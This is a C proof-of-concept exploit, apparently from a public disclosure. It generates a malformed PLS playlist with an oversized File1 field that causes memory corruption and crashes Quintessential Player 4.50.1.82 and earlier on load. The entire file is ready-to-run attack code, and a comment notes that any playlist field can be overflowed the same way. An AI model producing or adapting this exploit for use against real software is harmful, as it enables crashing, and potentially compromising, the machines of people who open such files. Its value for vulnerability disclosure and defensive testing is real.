#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[])
{

      FILE *Exploit;
      char buffer[1032]; /* Corruption Occurs after 1028 bytes */
      int x;

      printf("\n======================================================================\n");
      printf("0-day Quintessential Player 4.50.1.82 and prior Playlist Denial Of Service PoC \n");
      printf("Crashes Quintessential Player with a malformed playlist on load.\n");
      printf("Discovered and Coded By: Greg Linares <GLinares.code[at]gmail[dot]com>\n");
      printf("Usage: %s <output PLS file>\n", argv[0]);
      printf("====================================================================\n\n\n");


      if (argc < 2) {
              printf("Invalid Number Of Arguments\n");
              return 1;
      }


      Exploit = fopen(argv[1],"w");
  if ( !Exploit )
  {
      printf("\nCouldn't Open File!");
      return 1;
  }

      memset(buffer, 0, 1030);
      for (x=0;x<1030;x++) {
              strcat(buffer, "A");
      }


      /* Any field can be modified to cause the memory corruption
NumberofEntries, Length, Filename, Title etc. */

      fputs("[playlist]\r\nVersion=2\r\nNumberOfEntries=1", Exploit);
      fputs("\r\nFile1=", Exploit);
      fputs(buffer, Exploit);
      fputs("\r\nTitle1=0-day_Quintessential_Player_4.50.1.82_and_prior_Playlist_Denial_Of_Service_PoC_By_Greg_Linares\r\n",
Exploit);
      fputs("Length1=512", Exploit);


      printf("Exploit Succeeded...\n Output File: %s\n\n", argv[1]);


      printf("Questions, Comments, Feedback --> Greg Linares (GLinares.code[at]gmail[dot]com)\n");

      fclose(Exploit);
      return 0;
}